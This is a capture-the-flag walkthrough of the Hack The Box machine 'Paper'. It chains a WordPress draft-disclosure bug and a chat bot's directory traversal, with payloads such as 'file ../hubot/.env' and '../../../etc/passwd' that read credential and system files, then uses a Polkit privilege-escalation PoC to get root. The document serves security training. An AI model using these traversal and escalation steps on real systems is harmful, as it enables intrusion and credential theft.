# Hack The Box - Paper

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Paper-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Operating System](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Focus](https://img.shields.io/badge/Focus-Web%20%2F%20Linux-red?style=for-the-badge)

> **Paper** is an Easy-difficulty Linux machine that involves web enumeration, virtual host discovery, WordPress exploitation, Rocket.Chat enumeration, credential disclosure through the `recyclops` bot, SSH access, and privilege escalation through a vulnerable version of Polkit.

---

## Machine Information

| Property | Value |
|---|---|
| **Machine** | Paper |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty** | Easy |
| **IP Address** | `10.129.43.99` |
| **Main Technologies** | Apache, WordPress, Rocket.Chat, SSH |
| **Initial Access** | Credential Disclosure |
| **Privilege Escalation** | CVE-2021-3560 |
| **Main Vulnerabilities** | CVE-2019-17671, CVE-2021-3560 |

---

# Attack Path

```text
Nmap
    │
    ▼
Ports 22 / 80 / 443
    │
    ▼
Apache Web Server
    │
    ▼
Hidden VHost
    │
    ▼
office.paper
    │
    ▼
WordPress 5.2.3
    │
    ▼
CVE-2019-17671
    │
    ▼
WordPress Draft Posts
    │
    ▼
Rocket.Chat Registration URL
    │
    ▼
chat.office.paper
    │
    ▼
Rocket.Chat
    │
    ▼
recyclops Bot
    │
    ▼
Directory Traversal
    │
    ▼
/home/dwight/hubot/.env
    │
    ▼
Password Disclosure
    │
    ▼
SSH as dwight
    │
    ▼
User Flag
    │
    ▼
Polkit Enumeration
    │
    ▼
CVE-2021-3560
    │
    ▼
Create Privileged User
    │
    ▼
Root Access
    │
    ▼
Root Flag
```

---

# 1. Enumeration

## Nmap

I started by performing a full TCP port scan against the target:

```bash
nmap -sS -sV -sC -p- --min-rate 5000 -Pn 10.129.43.99 -oN nmap
```

The scan revealed the following open ports:

```text
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
```

I then performed service and version enumeration:

```bash
nmap -p22,80,443 -sV 10.129.43.99
```

The results showed:

- OpenSSH on port `22`
- Apache HTTP on port `80`
- Apache HTTPS on port `443`

---

# 2. HTTP Enumeration

I first visited the website hosted on port `80`.

The page displayed the default Apache web page and did not contain any immediately useful information.

I then intercepted the HTTP request using Burp Suite and inspected the response headers.

An interesting header was identified:

```text
X-Backend-Server
```

The value appeared to reference another hostname, indicating that the web server was likely using virtual host routing.

The discovered hostname was:

```text
office.paper
```

<img width="602" height="336" alt="image" src="https://github.com/user-attachments/assets/1b9d24c3-2343-4bc9-8c9e-76e25faee1cc" />


I added the domain to `/etc/hosts`:

```bash
echo "10.129.43.99 office.paper" | sudo tee -a /etc/hosts
```

I then accessed:

```text
http://office.paper
```

This revealed a WordPress website.

---

# 3. WordPress Enumeration

Using Wappalyzer, I identified the WordPress version:

```text
WordPress 5.2.3
```

Searching for vulnerabilities affecting this version revealed:

```text
CVE-2019-17671
```

This vulnerability allows unauthenticated users to access private or draft WordPress posts.

During the enumeration of the website, I also found a suspicious comment indicating that sensitive information might be stored inside WordPress drafts.

This made CVE-2019-17671 particularly interesting.

---

# 4. CVE-2019-17671 - WordPress Draft Disclosure

The vulnerability can be triggered by adding:

```text
?static=1
```

to the WordPress URL.

I accessed:

```text
http://office.paper/?static=1
```

<img width="955" height="908" alt="image" src="https://github.com/user-attachments/assets/3a434a1f-e01c-4c44-8ad4-8f2e0c4c2eae" />


The request successfully exposed the WordPress draft posts.

Among the draft content, I discovered information regarding an internal employee chat system.

The draft revealed a Rocket.Chat registration URL:

```text
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

---

# 5. Rocket.Chat Enumeration

I added the new hostname to `/etc/hosts`:

```bash
echo "10.129.43.99 chat.office.paper" | sudo tee -a /etc/hosts
```

I then accessed:

```text
http://chat.office.paper
```

A Rocket.Chat registration page was available.

Using the provided registration link, I created an account using credentials of my choice.

After logging in, I could access the `#general` channel.

The channel itself was read-only, so I could not send messages directly.

However, the chat history contained an interesting reference to a bot named:

```text
recyclops
```

The messages indicated that the bot could be contacted directly.

---

# 6. Recyclops Bot

I searched for the `recyclops` bot and opened a direct message conversation with it.

The chat history mentioned that sending:

```text
recyclops help
```

would return the bot's available commands.

I sent:

```text
recyclops help
```

The bot returned several available tasks.

The two most interesting commands were:

```text
list
file
```

The `list` command could be used to enumerate directories, while `file` could be used to read files.

The bot documentation stated that these functions were restricted to the `Sales` directory.

---

# 7. Directory Enumeration

I started by using the `list` command:

```text
list
```

I also enumerated the available sales directories:

```text
list sale
list sale_2
```

The contents were mostly uninteresting files and Easter eggs.

However, the bot's directory restrictions appeared to rely on path handling rather than a strict filesystem restriction.

This suggested that directory traversal might be possible using:

```text
..
```

---

# 8. Directory Traversal

I tested the following command:

```text
list ..
```

The command worked successfully.

The output appeared to correspond to the home directory of the `dwight` user.

Among the directories listed was:

```text
hubot
```

Since the bot itself was based on Hubot, this directory was particularly interesting.

---

# 9. Hubot Enumeration

I enumerated the Hubot directory:

```text
list ../hubot
```

An interesting file was identified:

```text
.env
```

Hubot applications commonly store configuration values inside `.env` files.

I therefore attempted to read it using the bot's `file` command:

```text
file ../hubot/.env
```

<img width="750" height="669" alt="image" src="https://github.com/user-attachments/assets/64150f25-d733-421c-99a4-a53054c46e2d" />


The bot returned:

```text
PASSWORD = Queenofblad3s!23
```

This provided a valid password.

---

# 10. User Enumeration

Before attempting SSH access, I used the same file-reading functionality to inspect:

```text
/etc/passwd
```

Because the bot was already running from a restricted directory, I used directory traversal:

```text
file ../../../etc/passwd
```

The response showed two regular users:

```text
rocketchat
dwight
```

The previously discovered password was then tested against the available accounts.

---

# 11. SSH Access

I attempted SSH authentication using the discovered password:

```bash
ssh dwight@10.129.43.99
```

Password:

```text
Queenofblad3s!23
```

The credentials were valid for the `dwight` account.

I successfully obtained an SSH shell as:

```text
dwight
```

<img width="959" height="334" alt="image" src="https://github.com/user-attachments/assets/95695046-479b-436f-bc50-02b09833109e" />


---

# 12. User Flag

After obtaining access as `dwight`, I checked the user's home directory:

```bash
ls -la
```

The user flag was located at:

```text
/home/dwight/user.txt
```

I retrieved it using:

```bash
cat /home/dwight/user.txt
```

---

# 13. Privilege Escalation Enumeration

After obtaining the user shell, I began enumerating the system for possible privilege escalation vectors.

One interesting component was the installed version of:

```text
polkit
```

Polkit is an authorization framework used by Linux systems to allow unprivileged processes to communicate with privileged processes.

I checked the installed version and searched for known vulnerabilities affecting it.

---

# 14. CVE-2021-3560 - Polkit Privilege Escalation

The installed Polkit version was vulnerable to:

```text
CVE-2021-3560
```

CVE-2021-3560 is an authentication bypass vulnerability in Polkit's `pkexec` component.

The vulnerability can allow an unprivileged local user to create a new local administrator account.

The newly created user can then be granted sudo privileges, resulting in complete system compromise.

---

# 15. Exploiting CVE-2021-3560

I obtained a public proof of concept for the vulnerability and transferred it to the target.

After transferring the exploit, I made it executable:

```bash
chmod +x poc.sh
```

The exploit allowed the username and password of the new account to be specified.

For example:

```text
Username: dotguy
Password: pass123
```

I then executed the exploit:

```bash
./poc.sh
```

<img width="959" height="526" alt="image" src="https://github.com/user-attachments/assets/5cf84206-790e-4003-866c-ebafc1f810ba" />


The output confirmed that a new local user had been created with elevated privileges.

---

# 16. Switching to the New User

I switched to the newly created account:

```bash
su dotguy
```

I entered the password configured in the exploit:

```text
pass123
```

The authentication was successful.

The newly created account had sudo privileges.

---

# 17. Root Access

Since the new user had sudo privileges, I could obtain a root shell using:

```bash
sudo bash
```

I verified the current user:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

<img width="961" height="245" alt="image" src="https://github.com/user-attachments/assets/bb1d7cad-8e11-408c-9cb1-500d77c5c678" />


I now had full administrative access to the machine.

---

# 18. Root Flag

The root flag was located at:

```text
/root/root.txt
```

I retrieved it using:

```bash
cat /root/root.txt
```

---

# Credentials

| Username | Password | Service |
|---|---|---|
| `dwight` | `Queenofblad3s!23` | SSH |
| `dotguy` | `pass123` | Local privileged account |

---

# Vulnerabilities

## CVE-2019-17671

WordPress vulnerability affecting version `5.2.3`.

The vulnerability allows unauthenticated users to access private or draft posts.

This was used to retrieve the hidden Rocket.Chat registration URL.

---

## Recyclops Directory Traversal

The `recyclops` bot restricted file operations to the `Sales` directory, but the restriction could be bypassed using directory traversal with:

```text
..
```

This allowed access to directories outside the intended location.

The vulnerability was used to read:

```text
../hubot/.env
```

and:

```text
../../../etc/passwd
```

The `.env` file exposed a password that could be reused for SSH access.

---

## CVE-2021-3560

Polkit authentication bypass vulnerability.

The vulnerability allowed the low-privileged `dwight` user to create a new local account with administrator privileges.

After creating the privileged account, sudo could be used to obtain a root shell.

---

# Flags

```text
User Flag:
<USER_FLAG>

Root Flag:
<ROOT_FLAG>
```

---

# Tools Used

- Nmap
- Burp Suite
- Wappalyzer
- Browser
- Rocket.Chat
- SSH
- CVE-2019-17671 PoC
- CVE-2021-3560 PoC

---

# Key Takeaways

- Always perform full port enumeration before focusing on a specific service.
- HTTP response headers can reveal hidden virtual hosts.
- Virtual host enumeration is an important part of web reconnaissance.
- WordPress versions should be checked against known vulnerabilities.
- CVE-2019-17671 can expose private WordPress draft posts without authentication.
- Information disclosed in application drafts can reveal internal infrastructure.
- Chat applications should be enumerated carefully because sensitive information may be present in conversations.
- Bots and automated integrations should be tested for unintended functionality.
- Directory traversal can bypass poorly implemented filesystem restrictions.
- Configuration files such as `.env` can contain sensitive credentials.
- Credentials discovered during web enumeration should be tested against other exposed services when authorized.
- Local package versions should always be checked during Linux privilege escalation enumeration.
- CVE-2021-3560 can allow an unprivileged local user to create a privileged account through Polkit.
- Once a user with sudo privileges is obtained, full root access may be possible.

---

# Final Attack Chain

```text
Port Enumeration
        ↓
Apache
        ↓
Hidden VHost
        ↓
office.paper
        ↓
WordPress 5.2.3
        ↓
CVE-2019-17671
        ↓
Private Draft Posts
        ↓
Rocket.Chat Registration
        ↓
chat.office.paper
        ↓
recyclops Bot
        ↓
Directory Traversal
        ↓
../hubot/.env
        ↓
Password Disclosure
        ↓
SSH as dwight
        ↓
User Flag
        ↓
Polkit Enumeration
        ↓
CVE-2021-3560
        ↓
Create Privileged User
        ↓
Sudo Privileges
        ↓
Root Access
        ↓
Root Flag
```

---

# Conclusion

Paper demonstrates a multi-stage attack chain that begins with web enumeration and ends with complete Linux system compromise.

The initial enumeration revealed an Apache server exposing ports `80` and `443`. Inspection of the HTTP response headers revealed a hidden virtual host, which led to the `office.paper` WordPress installation.

The WordPress version was vulnerable to CVE-2019-17671, allowing unauthenticated access to private draft posts. One of these drafts exposed a registration URL for an internal Rocket.Chat instance.

After registering an account on Rocket.Chat, the `#general` channel revealed the existence of the `recyclops` bot. By interacting with the bot and abusing its directory handling, it was possible to escape the intended `Sales` directory using `..`.

This allowed the contents of the Hubot `.env` file to be read, exposing a password. The same functionality was used to enumerate `/etc/passwd`, revealing the `dwight` user.

The recovered password was reused to authenticate over SSH as `dwight`, providing access to the user flag.

For privilege escalation, local enumeration revealed a vulnerable version of Polkit. CVE-2021-3560 was exploited to create a new local account with administrator privileges. After switching to the newly created user, sudo privileges could be used to obtain a root shell and retrieve the root flag.

The complete attack path was:

```text
Hidden Virtual Host
→ WordPress Enumeration
→ CVE-2019-17671
→ Draft Post Disclosure
→ Rocket.Chat
→ Recyclops Bot
→ Directory Traversal
→ .env Credential Disclosure
→ SSH as dwight
→ CVE-2021-3560
→ Privileged User
→ Sudo
→ Root
```
